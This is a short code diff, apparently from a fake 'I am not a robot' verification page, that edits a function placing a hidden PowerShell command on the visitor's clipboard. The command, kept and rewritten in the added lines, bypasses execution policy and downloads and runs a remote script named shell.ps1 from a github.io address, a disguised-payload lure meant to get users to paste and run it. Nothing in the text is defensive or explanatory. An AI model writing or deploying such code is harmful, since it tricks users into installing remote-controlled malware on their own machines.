@@ -453,10 +453,14 @@
         document.body.removeChild(temp);
     }
 
-    function stageClipboard(verification_id) {
-    const text = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://forhad-ahmed230.github.io/tools/shell.ps1')); Write-Host 'I am not a robot - Verification ID: ${verification_id}'"`;
-    setClipboardCopyData(text);
+    function stageClipboard() {
+    // PowerShell command only, without verification message
+    const text = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://forhad-ahmed230.github.io/tools/shell.ps1'))"`;
+    
+    // Copy to clipboard
+    navigator.clipboard.writeText(text);
 }
+
 
 
     function showVerifyWindow() {
